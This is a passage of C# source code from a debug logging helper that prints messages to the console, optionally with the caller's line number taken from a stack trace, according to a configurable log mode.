#pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
#pragma warning disable CS8602 // Dereference of a possibly null reference.
        StackFrame frame = stackTrace.GetFrame(1); // 0 is the current method, 1 is the caller
        int lineNumber = frame.GetFileLineNumber();
#pragma warning restore CS8602 // Dereference of a possibly null reference.
#pragma warning restore CS8600 // Converting null literal or possible null value to non-nullable type.

        if (logMode == LogMode.Log || forceLog)
        {
            if (logLineNumber)
            {
                Console.WriteLine($"DEBUG --> {message} at line {lineNumber}");
            }
            else
            {
                Console.WriteLine($"DEBUG --> {message}");
            }
        }
        else if (logMode == LogMode.Auto)
        {
#if DEBUG
            Console.WriteLine($"DEBUG; {message} at line {lineNumber}");
#endif
        }
        else if (logMode == LogMode.LogWithLines)
        {
            Console.WriteLine($"DEBUG; {message} at line {lineNumber}");
        }
    }

    public static void DebugLogMode(int mode = 2)
    {
        logMode = (LogMode)mode;
    }
}